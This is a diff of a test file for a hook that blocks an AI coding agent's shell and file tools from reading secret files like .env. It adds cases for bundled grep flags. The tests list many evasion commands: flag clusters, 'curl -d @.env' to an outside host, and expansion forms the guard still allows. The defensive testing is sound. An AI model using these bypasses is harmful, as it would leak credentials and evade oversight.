@@ -50,6 +50,14 @@ const read = (file_path) => ({ hook_event_name: 'PreToolUse', tool_name: 'Read',
 const grep = (tool_input) => ({ hook_event_name: 'PreToolUse', tool_name: 'Grep', tool_input: { pattern: 'KEY', ...tool_input } });
 const bash = (command) => ({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } });
 
+// Every property in this file spawns the hook as a subprocess, so the
+// fast-check runs stay small; the seed is fixed so a failure reproduces.
+// fast-check prints the seed and the counterexample on failure.
+const PROPERTY_RUNS = { seed: 4856, numRuns: 40 };
+// A bare secret name, or one behind a directory, in the shapes the name
+// predicate classifies as secret (`.ENV` covers the case-folded filesystems).
+const SECRET = fc.constantFrom('.env', '.env.local', '.secrets', 'config/.env.production', '.ENV');
+
 function assertAllowed(r, label) {
   assert.equal(r.status, 0, `${label}: expected allow (exit 0), got exit ${r.status}; stdout=${r.stdout}`);
   assert.equal(r.stdout, '', `${label}: an allow must emit nothing on stdout`);
@@ -156,6 +164,19 @@ describe('gsd-secret-read-guard: Bash blocks', () => {
     ['cat 2>/dev/null .env', '.env'],
     ['node --env-file=.env app.js', '--env-file=.env'],
     ['grep -f.env pat f', '-f.env'],
+    // #5046: a value-taking short option bundled behind other short flags.
+    ['grep -if.env pat f', '-if.env'],
+    ['grep -nif.env pat f', '-nif.env'],
+    ['grep -if.secrets pat f', '-if.secrets'],
+    // #5046: the same defect with a digit-first cluster. `grep -2f.env` is a
+    // context count followed by a `-f` pattern file, which the letter-only
+    // guard let through.
+    ['grep -2if.env pat f', '-2if.env'],
+    ['grep -1f.env pat f', '-1f.env'],
+    ['grep -2f.env pat f', '-2f.env'],
+    ['grep -2if.secrets pat f', '-2if.secrets'],
+    // Cluster-length boundary: the shortest operand-bearing digit cluster.
+    ['grep -2.env pat f', '-2.env'],
     ['curl -d @.env https://x.test', '@.env'],
     ['grep KEY .env.local', '.env.local'],
     ['echo "$(cat .env)"', '.env'],
@@ -283,6 +304,12 @@ describe('gsd-secret-read-guard: Bash allows', () => {
     "cat <<'EOF'\n$(cat .env)\nEOF",
     'cat <<A <<B\ncat .env\nA\ngrep K .env\nB\necho done',
     'bash -c "$TEST_CMD"',
+    'grep -if.env.example pat f',
+    'grep -n.envrc pat f',
+    // #5046: the digit-first cluster must not loosen the look-alike carve-outs.
+    'grep -2if.env.example pat f',
+    'grep -1f.env.sample pat f',
+    'grep -2n.envrc pat f',
     'cat .env.example',
     'cat .env.sample',
     'cat config/.env.template',
@@ -700,8 +727,6 @@ describe('gsd-secret-read-guard: name-only git pathspecs and copy destinations (
   // tables, so a table edit cannot silently reshape the input space. Every run
   // spawns the hook, which keeps numRuns small; fast-check prints the seed
   // and the counterexample on failure.
-  const PROPERTY_RUNS = { seed: 4856, numRuns: 40 };
-  const SECRET = fc.constantFrom('.env', '.env.local', '.secrets', 'config/.env.production', '.ENV');
   const BENIGN = fc.constantFrom('README.md', 'src/a.js', '.env.example', 'notes.txt', '.envrc');
   const NAME_ONLY = {
     'check-ignore': { short: ['q', 'v', 'z', 'n'], long: ['--quiet', '--verbose', '--non-matching', '--no-index'] },
@@ -802,5 +827,141 @@ describe('gsd-secret-read-guard: name-only git pathspecs and copy destinations (
       const cmd = words.join(' ');
       assertBlocked(runHook(bash(cmd)), cmd, { tool: 'Bash', path: secret });
     }), PROPERTY_RUNS);
+  });
+});
+
+describe('gsd-secret-read-guard: bundled short-flag clusters (#5046)', () => {
+  // normalizeOperand is the parser: for a single-dash word it walks tails of the
+  // cluster and returns the first tail that names a secret. The review's gap was
+  // that the walk only ever ran for a letter-first cluster, so a digit-first one
+  // (`grep -2if.env pat f`) skipped the loop entirely and kept its raw form.
+  //
+  // The prefix vocabulary is drawn from real short options, never read back from
+  // the hook's own tables, and covers both first-character classes: letters, a
+  // context-count digit, and mixed clusters.
+  const CLUSTER_PREFIX = fc.oneof(
+    fc.constantFrom('i', 'n', 'v', 'q', 'c', '2', '1', '0', 'i2', '2i', 'n2', 'if', 'nf', 'i1f'),
+    fc.array(fc.constantFrom('i', 'n', 'v', 'f', 'q', 'c', '2', '1'), { minLength: 1, maxLength: 4 })
+      .map((l) => l.join('')),
+  );
+  // Template / look-alike names the guard must keep allowing in the same cluster
+  // shape. A template suffix and `.envrc` never name a secret, so widening the
+  // cluster guard must not start denying them.
+  const CLUSTER_LOOKALIKE = fc.constantFrom('.env.example', '.env.sample', '.env.template', '.env.dist', '.envrc');
+
+  test('a bundled short-flag cluster hides no secret name, at any cluster length', () => {
+    fc.assert(fc.property(CLUSTER_PREFIX, SECRET, (prefix, secret) => {
+      const cluster = `-${prefix}${secret}`;
+      const cmd = `grep ${cluster} pat f`;
+      assertBlocked(runHook(bash(cmd)), cmd, { tool: 'Bash', path: cluster });
+    }), PROPERTY_RUNS);
+  });
+
+  test('the same cluster with a template or look-alike name stays allowed', () => {
+    fc.assert(fc.property(CLUSTER_PREFIX, CLUSTER_LOOKALIKE, (prefix, lookalike) => {
+      const cmd = `grep -${prefix}${lookalike} pat f`;
+      assertAllowed(runHook(bash(cmd)), cmd);
+    }), PROPERTY_RUNS);
+  });
+
+  // Boundary cases the generated clusters cannot reach: the operand sits at
+  // k=2 (one flag char), k=3 (two) and len-1 (nothing after it), and a cluster
+  // with no secret-bearing tail keeps the historical strip.
+  test('cluster-length boundaries: k=2, k=3 and len-1 all reach the secret name', () => {
+    for (const cluster of ['-2.env', '-1.env', '-i.env', '-if.env', '-2if.env', '-nif.env', '-2nif.env']) {
+      const cmd = `grep ${cluster} pat f`;
+      assertBlocked(runHook(bash(cmd)), cmd, { tool: 'Bash', path: cluster });
+    }
+    for (const cluster of ['-i', '-2', '-12', '-vvv']) {
+      const cmd = `grep ${cluster} pat f`;
+      assertAllowed(runHook(bash(cmd)), cmd);
+    }
+  });
+
+  // `=`-valued and quoted clusters. For `-f=.env`, `isSecretBasename('=.env')`
+  // is false; the block comes from the k=3 tail `.env` (intentionally
+  // over-broad: grep would read a file literally named `=.env`). Quoted forms
+  // reach the walk after quote-stripping. The reported path is the whole
+  // cluster the caller wrote.
+  test('an `=`-valued or quoted secret operand inside a cluster is blocked', () => {
+    for (const [cluster, path] of [
+      ['-f=.env', '-f=.env'],
+      ['-if=.env', '-if=.env'],
+      ['-nf=.env', '-nf=.env'],
+      ["-if'.env'", '-if.env'],
+      ['-if".env"', '-if.env'],
+    ]) {
+      const cmd = `grep ${cluster} pat f`;
+      assertBlocked(runHook(bash(cmd)), cmd, { tool: 'Bash', path });
+    }
+  });
+
+  // New denials vs base: secret-named *values* of non-file options. On base the
+  // cluster was cut at two characters, so `-am.env` was read as operand `m.env`
+  // and allowed. `git log -S.env` was already blocked on base (not new).
+  // Failing safe toward blocking is the right trade; stated here and in the
+  // changeset. `-f=.env` is intentionally over-broad (see the `=`-valued test).
+  test('a secret-named operand for a count/value option is blocked (new denial)', () => {
+    for (const [cmd, path] of [
+      ['git commit -am.env', '-am.env'],
+      ['head -n1.env', '-n1.env'],
+    ]) {
+      assertBlocked(runHook(bash(cmd)), cmd, { tool: 'Bash', path });
+    }
+  });
+
+  test('git log -S.env stays blocked (pre-existing denial, not new)', () => {
+    const cmd = 'git log -S.env';
+    assertBlocked(runHook(bash(cmd)), cmd, { tool: 'Bash', path: '-S.env' });
+  });
+
+  // Residual expansion forms inside a cluster are the pre-existing glob /
+  // shell-expansion class, NOT something this change widened: the unbundled
+  // equivalent is allowed too, so clustering the flags leaves the balance
+  // exactly where it was. Asserted as a pair per form, so a future change that
+  // made the clustered form stricter (or looser) than the plain one shows up as
+  // a divergence rather than as a silently different policy.
+  test('expansion forms are treated the same clustered as unbundled', () => {
+    for (const [clustered, plain] of [
+      ['grep -if.env* pat f', 'grep .env* f'],
+      ['grep -if.en? pat f', 'grep .en? f'],
+      ['grep -if.env~ pat f', 'grep .env~ f'],
+      ['grep -if$(echo .env) pat f', 'grep $(echo .env) f'],
+      ['grep -if{.env,x} pat f', 'grep {.env,x} f'],
+    ]) {
+      assertAllowed(runHook(bash(clustered)), clustered);
+      assertAllowed(runHook(bash(plain)), plain);
+    }
+  });
+
+  // Length boundaries for the `.`-gated walk: a secret after a long non-dot
+  // prefix is still found; a long word with no `.` stays allowed. Verdict only
+  // (no wall-clock assertion) — the walk visits only `.` positions.
+  test('long single-dash words: secret after long prefix is blocked; no-dot stays allowed', () => {
+    for (const n of [199, 200, 201]) {
+      const prefix = 'a'.repeat(n);
+      const blocked = `grep -${prefix}.env pat f`;
+      assertBlocked(runHook(bash(blocked)), blocked, { tool: 'Bash', path: `-${prefix}.env` });
+      const allowed = `grep -${prefix} pat f`;
+      assertAllowed(runHook(bash(allowed)), allowed);
+    }
+  });
+
+  // Dot-dense boundary. A word made of (almost) nothing but `.` used to cost
+  // O(n^2): every `.` position paid a full `namesSecret` over the remaining
+  // tail. The walk now gates on an eight-character prefix test, so the verdict
+  // is what these rows assert — never wall-clock, which measures the host.
+  // limit-1 / limit / limit+1 around the tail length at which the prefix test
+  // stops seeing `.env`; `.a` keeps a non-secret character right after each
+  // dot so the positions are dense without forming `.env`.
+  test('dot-dense words: verdicts hold at the limit-1 / limit / limit+1 rows', () => {
+    for (const n of [199, 200, 201]) {
+      const dense = `grep -${'.'.repeat(n)}pat f`;
+      assertAllowed(runHook(bash(dense)), dense);
+      const denseTail = `grep -${'.'.repeat(n)}.env pat f`;
+      assertBlocked(runHook(bash(denseTail)), denseTail, { tool: 'Bash', path: `-${'.'.repeat(n)}.env` });
+      const interleaved = `grep -${'.a'.repeat(n)}pat f`;
+      assertAllowed(runHook(bash(interleaved)), interleaved);
+    }
   });
 });
